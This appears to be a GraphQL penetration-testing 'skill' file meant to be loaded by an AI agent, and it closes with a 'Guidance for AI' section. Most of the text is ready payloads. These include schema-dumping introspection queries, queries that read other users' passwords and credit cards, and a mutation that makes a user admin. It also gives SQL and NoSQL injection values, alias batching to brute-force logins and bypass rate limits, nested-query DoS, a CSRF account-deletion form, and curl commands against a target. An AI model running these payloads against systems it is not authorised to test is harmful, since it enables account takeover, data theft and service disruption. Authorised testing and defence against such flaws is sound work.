# GraphQL Security Testing Skill

## Goal

Identify and exploit GraphQL-specific vulnerabilities including introspection abuse, injection, and authorization flaws.

## Methodology

1. **Discover GraphQL Endpoint:** Find /graphql, /api/graphql, or similar endpoints
2. **Query Introspection:** Dump schema to understand available types and operations
3. **Test Authorization:** Access data/operations without proper authentication
4. **Test Injection:** SQL, NoSQL injection through GraphQL variables
5. **Abuse Features:** Batching, aliases, nested queries for DoS or bypass

## Common GraphQL Endpoints

```
/graphql
/api/graphql
/graphql/v1
/graphql/api
/graphiql
/api/graphiql
/graphql.php
/graphql/console
```

## Introspection Query

```graphql
# Full schema dump
{__schema{types{name,fields{name,args{name,type{name,kind,ofType{name,kind}}}}}}}

# Alternative format
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    types { name kind fields { name type { name } } }
  }
}
```

## Authorization Testing

```graphql
# Access other users' data
query {
  user(id: "VICTIM_ID") {
    email
    password
    creditCard
  }
}

# Access admin mutations
mutation {
  deleteUser(id: "123") { success }
}
```

## Injection via Variables

```graphql
# SQL Injection
query getUser($id: String!) {
  user(id: $id) { name email }
}
# Variables: {"id": "1' OR '1'='1"}

# NoSQL Injection
# Variables: {"id": {"$ne": ""}}
```

## Batching Attacks

```graphql
# Brute force via aliases
query {
  attempt1: login(password: "pass1") { token }
  attempt2: login(password: "pass2") { token }
  attempt3: login(password: "pass3") { token }
  # ... up to thousands of attempts
}

# Bypass rate limiting
```

## Nested Query DoS

```graphql
# Deep nesting can cause resource exhaustion
query {
  users {
    friends {
      friends {
        friends {
          friends { name }
        }
      }
    }
  }
}
```

## Field Suggestions

```graphql
# Typo in field name reveals valid fields
query { user { pasword } }  # Did you mean 'password'?
```

## Mutations Testing

```graphql
# Find sensitive mutations
mutation {
  updateUser(id: "123", role: "admin") { id role }
}

mutation {
  resetPassword(userId: "123") { tempPassword }
}
```

## CSRF in GraphQL

```html
<!-- If no CSRF protection and uses GET or simple POST -->
<form action="https://target.com/graphql" method="POST">
  <input name="query" value="mutation{deleteAccount}" />
</form>
```

## Tools

* **GraphQL Voyager** - Visual schema explorer
* **graphql-cop** - GraphQL security scanner  
* **InQL** - Burp Suite extension
* **Altair GraphQL Client** - GraphQL IDE

## Example Commands

```bash
# Introspection with curl
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name}}}"}'

# Using graphql-cop
python graphql-cop.py -t https://target.com/graphql
```

## Guidance for AI

* Activate when testing GraphQL APIs
* Always try introspection first to map the schema
* Introspection disabled? Try field suggestion errors
* Check authorization on each query/mutation independently
* Batching with aliases can bypass rate limits
* Test for injection through all input variables
* Deeply nested queries can cause DoS
